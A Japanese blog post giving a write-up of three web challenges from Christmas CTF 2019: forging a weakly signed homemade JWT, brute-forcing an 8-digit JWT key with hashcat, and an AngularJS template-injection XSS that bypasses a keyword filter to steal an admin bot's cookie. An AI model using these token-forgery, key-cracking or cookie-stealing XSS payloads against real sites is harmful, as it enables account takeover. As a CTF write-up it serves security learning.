---
layout: post
title: Christmas CTF の write-up
categories: [ctf]
date: 2019-12-29 17:00:00 +0900
---

12 月 25 日に開催された [Christmas CTF](https://x-mas.aleph.kr/) に、チーム zer0pts として参加しました。最終的にチームで 7353 点を獲得し、順位は得点 231 チーム中 9 位でした。うち、私は 3 問を解いて 2401 点を入れました。

以下、私が解いた問題の write-up です。

## [Web 608] watermelon
> Go!

与えられた URL にアクセスすると、mp3 や wav をアップロードし、アップロードされた音楽にいいねを付けることができる Web アプリケーションが表示されました。

色々試していているうちに `/xmas/robots.txt` に以下のようなコンテンツがありました。

```
User-agent: *
Disallow: /xmas/.git
```

なるほど。`/xmas/.git` にアクセスすると autoindex が表示され、`config` や `description` などのファイルの存在が確認できました。[kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) の `rip-git.pl` で clone するとソースコードが得られました。

`flag.php` という怪しげなファイルもあり、これは以下のような内容でした。

```php
<?php

require_once __DIR__ . '/api/userAPI.php';
require_once __DIR__ . '/api/musicAPI.php';
require_once __DIR__ . '/api/voteAPI.php';

$flag = "XMAS{******}";

if ($login) {
    $music = getMusicChartByUser_no((int)$user['user_no'], 0, 100);
    for ($i = 0; $i < count($music); $i++) {
        if ($music[$i]['vote'] > 1225) {
            die($flag);
        }
    }
}
```

大量にいいねを付けられた楽曲のあるユーザであればフラグが表示されるようです。大量にユーザを生成していいねをつけるスクリプトを書くことをまず考えましたが、登録ページには reCAPTCHA が導入されており難しそうです。

ログイン情報の保持には JWT が使われており、これを実装している `jwt.php` は以下のような内容でした。

```php
<?php
class jwt
{
    protected $alg;
    function __construct()
    {
        $this->alg = 'sha256';
    }

    function hashing(array $data)
    {
        $header = json_encode(array(
            'alg'=> $this->alg,
            'typ'=> 'JWT'
        ));

        $payload = json_encode($data);
        $signature = hash($this->alg, $header.$payload);
        return base64_encode($header.'.'.$payload.'.'.$signature);
    }

    function dehashing($token)
    {
        $parted = explode('.', base64_decode($token));
        $signature = $parted[2];

        if(hash($this->alg, $parted[0].$parted[1]) != $signature)
            die("<script>alert('INVALID JWT!!');</script>");

        $payload = json_decode($parted[1],true);
        return $payload;
    }
}

$jwt = new jwt();
```

署名アルゴリズムは `hash($this->alg, $header.$payload)` と大変単純です。これを利用すれば好きなユーザでログインできるはずです。雑に総当りで試していると、ユーザ ID が `3001` になるような以下のような文字列を Cookie にセットしてみるとフラグが得られました。

```
>>> $jwt->hashing(['user_no' => 3001])
=> "eyJhbGciOiJzaGEyNTYiLCJ0eXAiOiJKV1QifS57InVzZXJfbm8iOjMwMDF9Ljg3ZmU4NjRkNzE4MTIwMzI2YTRmYTRmZGY4ZTlhMGMwZGZmNTMwMDViNTY0N2Q2ZmRiZDZkYzhkYTRiODFhN2Y="
```

```
XMAS{Last Christmas~ I gave you my heart~ <3}
```

## [Web 849] JWT
> Plz crack jwt
> 
> (URL)
> 
> * CSRF 문제와 같은 파일입니다
> 
> 添付ファイル: src.zip (ソースコード)

ソースコードが与えられています。どこでフラグが得られるか `flag` で検索してみましょう。`routes/bruth.js` に以下のようなコードがありました。

```javascript
︙
const CONF = require('../config');
︙
router.use((req, res, next) => {
  const token = req.cookies.token_b;
  if (token) {
    jwt.verify(token, CONF.jwt.bruth.key, CONF.jwt.bruth.options, (err, decoded) => {
      if (err) {
        if (err.name === 'TokenExpiredError') {
          return res.send({ code: 401, msg: '토큰이 만료되었습니다' });
        } else if (err.name === 'JsonWebTokenError') {
          return res.send({ code: 401, msg: '토큰에 에러가 있습니다' });
        } else {
          return res.send({ code: 401, msg: "토큰 인증 절차에 오류가 발생했습니다", err: err.message });
        }
      } else {
        req.auth = decoded;
        next();
      }
    });
  } else {
    next();
  }
});
︙
router.get('/flag', wrap(async (req, res) => {
  if (!req.auth) return res.send({ code: 401 });
  if (!req.auth.isAdmin) return res.send({ code: 403 });

  res.send({ code: 200, flag: CONF.flag.bruth });
}));
︙
```

JWT として与えられたユーザ情報について、`isAdmin` というプロパティになにか入っていれば `/bruth/flag` にアクセスしたときにフラグが得られるようです。JWT の署名に使われている鍵の `CONF.jwt.bruth.key` は `config.js` から来たようなので、見てみましょう。

```javascript
const fs = require('fs');

module.exports = {
︙
  jwt: {
    bruth: {
      key: '********', // 0~9, 8 length
      options: {
        issuer: 'c2w2m2',
        expiresIn: '1d',
        algorithm: 'HS256',
      }
    },
︙
  },
︙
}
```

数字 8 ケタのようです。適当に問題ページで JWT を発行させて [hashcat](https://hashcat.net/hashcat/) で殴ってみましょう。

```
>hashcat64.exe -m 16500 jwt.hash -a 3 -w 3 ?d?d?d?d?d?d?d?d
hashcat (v5.1.0) starting...
︙
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE1MiwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTU3NzI1Mjc4OSwiZXhwIjoxNTc3MzM5MTg5LCJpc3MiOiJjMncybTIifQ.PVjamYSoJnn_AP016-gxUiCv6VHkvcr3oGTpdyLTMUc:40906795
Session..........: hashcat
Status...........: Cracked
Hash.Type........: JWT (JSON Web Token)
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE1Mi...yLTMUc
Time.Started.....: Wed Dec 25 15:00:57 2019 (4 secs)
Time.Estimated...: Wed Dec 25 15:01:01 2019 (0 secs)
︙
```

一瞬で鍵が `40906795` であるとわかりました。[jwt.io](https://jwt.io/) でこの鍵を使って `isAdmin: true` を生やして `/bruth/flag` にアクセスするとフラグが得られました。

```
XMAS{bru73-f0rc3-jw7_^^7}
```

## [Web 944] CSRF
> CSRF? XSS? 뭐징..?? 어드민이 글을 본다고는 하는데...
> 
> (URL)
> 
> * JWT 문제와 같은 파일입니다
> 
> 添付ファイル: src.zip (ソースコード)

ソースコードは JWT と同じようです。

これはブログっぽい Web アプリケーションのようで、記事は投稿した本人にしか読めないようです。とりあえず与えられた URL にアクセスして適当にユーザ登録とログインをします。XSS ができないか `<s>neko</s>` という内容の記事を投稿してみると、斜線の入った `neko` の記事が表示されました。`<script>alert(1)</script>` を投稿してみると、今度は `{"code":400}` と返ってきました。どういうことか、ソースコードを見てみましょう。

```javascript
︙
router.get('/board/:id', needAuth, wrap(async (req, res) => {
  const { id } = req.params;
  const { uid, isAdmin } = req.auth;

  const board = await BoardCsrf.findOne({
    where: {
      id,
    },
    attributes: ['uid', 'title', 'content'],
  });

  if (!board) return res.send({ code: 404 });
  if (board.uid !== uid && !isAdmin) return res.send({ code: 404 });

  if (board.content.match(/script|img|on/i)) return res.send({ code: 400 });

  res.send(`<html><h1>${board.title}</h1><span>${board.content}</span></html>`);
}));
︙
```

`script` `img` `on` が含まれる記事は表示できないようです。どうにかならないかググってみると、[Browser's XSS Filter Bypass Cheat Sheet · masatokinugawa/filterbypass Wiki](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#angular%E3%81%AE%E5%88%A9%E7%94%A8) という記事がヒットしました。これを参考に、まず以下のような内容の `index.php` を用意します。

```php
<?php
header('Access-Control-Allow-Origin: *');
?>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
```

`{% raw %}<link rel="import" href="(URL)"><p ng-app>{{this['co'+'nstructor']['co'+'nstructor']('alert(1)')()}}{% endraw %}` という内容の記事を投稿するとアラートが表示されました。`{% raw %}<link rel="import" href="(URL)"><p ng-app>{{this['co'+'nstructor']['co'+'nstructor']('eval(atob("(document.cookie を iframe で取り出すコードを Base64 エンコードしたもの)"))')()}}{% endraw %}` という内容の記事を投稿すると (どうやら投稿された記事を巡回しているようで) 管理者からのアクセスが来、フラグが得られました。

```
XMAS{ez_xs5_ch41l_m3rry_chr1stm4ssssssss}
```